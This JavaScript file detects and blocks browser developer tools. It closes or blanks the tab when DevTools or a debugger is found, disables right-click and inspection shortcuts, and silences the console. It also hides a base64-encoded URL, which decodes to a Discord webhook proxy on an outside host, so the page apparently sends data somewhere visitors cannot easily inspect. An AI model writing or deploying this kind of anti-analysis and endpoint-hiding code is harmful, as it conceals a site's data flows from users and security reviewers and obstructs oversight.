// Anti-DevTools Protection
(function() {
    'use strict';
    
    let devtoolsOpen = false;
    const threshold = 160;
    
    // Check if DevTools is open
    const checkDevTools = () => {
        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
        
        if (widthThreshold || heightThreshold) {
            if (!devtoolsOpen) {
                devtoolsOpen = true;
                // Close the tab immediately
                window.open('', '_self').close();
                // Fallback if above doesn't work
                window.location.href = 'about:blank';
            }
        }
    };
    
    // Check every 100ms for DevTools
    setInterval(checkDevTools, 100);
    
    // Debugger detection (more aggressive)
    const debuggerCheck = () => {
        const start = performance.now();
        debugger;
        const end = performance.now();
        
        if (end - start > 100) {
            window.open('', '_self').close();
            window.location.href = 'about:blank';
        }
    };
    
    setInterval(debuggerCheck, 1000);
    
})();

// Disable right-click
document.addEventListener('contextmenu', e => {
    e.preventDefault();
    return false;
});

// Disable keyboard shortcuts
document.addEventListener('keydown', e => {
    // F12
    if (e.key === 'F12') {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+Shift+I (Inspect)
    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+Shift+C (Inspect Element)
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+Shift+J (Console)
    if (e.ctrlKey && e.shiftKey && e.key === 'J') {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+U (View Source)
    if (e.ctrlKey && e.key === 'U') {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+S (Save Page)
    if (e.ctrlKey && e.key === 'S') {
        e.preventDefault();
        return false;
    }
});

// Hide webhook URL (base64 encoded)
window.WEBHOOK_URL = atob('aHR0cHM6Ly9kaXNjb3JkLXByb3h5LmR1Y2tzZHVja3M3NjIud29ya2Vycy5kZXY=');

// Clear console periodically
setInterval(() => {
    console.clear();
}, 2000);

// Disable console methods
(function() {
    const noop = function() {};
    const methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'dir', 'dirxml', 'group', 'groupCollapsed', 'groupEnd', 'clear'];
    
    methods.forEach(method => {
        console[method] = noop;
    });
})();
